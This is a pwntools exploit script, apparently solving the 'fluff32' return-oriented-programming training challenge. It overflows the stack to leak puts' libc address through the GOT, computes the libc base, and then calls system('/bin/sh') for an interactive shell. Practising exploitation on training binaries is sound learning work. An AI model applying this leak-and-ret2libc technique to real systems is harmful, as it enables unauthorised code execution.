#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./fluff32')
libc = ELF("./libc.so.6")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start(env={"LD_PRELOAD": "./libc.so.6"})
io.recvuntil("> ")

payload = (
    b"A" * 44 +
    p32(exe.plt["puts"]) +
    p32(exe.functions["main"].address) +
    p32(exe.got["puts"])
)

io.sendline(payload)
data = io.recvline()
leak = u32(data[:4])
libc.address = leak - libc.sym.puts

log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)

io.recvuntil("> ")

payload = (
    b"A" * 44 +
    p32(libc.sym.system) +
    b"BBBB" +
    p32(next(libc.search(b"/bin/sh")))
)
io.sendline(payload)

io.interactive()

